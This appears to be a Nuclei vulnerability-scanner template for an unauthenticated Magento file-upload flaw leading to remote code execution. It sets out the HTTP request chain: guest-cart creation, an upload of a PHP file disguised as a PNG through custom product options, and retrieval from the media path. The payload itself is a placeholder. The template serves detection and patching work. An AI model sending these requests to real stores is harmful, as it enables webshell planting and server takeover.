# Nuclei Template: Magento PolyShell – Unauthenticated File Upload to RCE
**Template ID:** magento-polyshell-rce
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`magento-polyshell-rce.yaml`)

## Vulnerability Information & PoC

## Description
Magento lacks file type validation on custom product options file upload feature accessible via unauthenticated REST/GraphQL APIs. Attackers can upload arbitrary PHP files through guest cart endpoints without authentication. Files are stored in pub/media/custom_options/quote/ directory with predictable paths. If web server allows PHP execution in media directories, this leads to remote code execution.

## Impact
Unauthenticated attackers can upload PHP webshells disguised as PNG files and achieve remote code execution on the server.

## Steps to reproduce / Exploit Payload
```http
POST /graphql HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"}

POST /rest/default/V1/guest-carts HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

POST /rest/default/V1/guest-carts/{{cart_id}}/items HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"cart_item":{"product_option":{"extension_attributes":{"custom_options":[{"extension_attributes":{"file_info":{"base64_encoded_data":"{{polyglot_b64}}","name":"{{php_filename}}","type":"image/png"}},"option_id":"12345","option_value":"file"}]}},"qty":1,"sku":"{{product_sku}}"}}

GET /pub/media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
Host: {{Hostname}}

GET /media/custom_options/quote/{{upload_subdir1}}/{{upload_subdir2}}/{{upload_filename}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/markshust/magento-polyshell-patch/
- https://slcyber.io/research-center/magento-polyshell-unauthenticated-file-upload-to-rce-in-magento-apsb25-94/#about-assetnote
- https://helpx.adobe.com/security/products/magento/apsb25-94.html
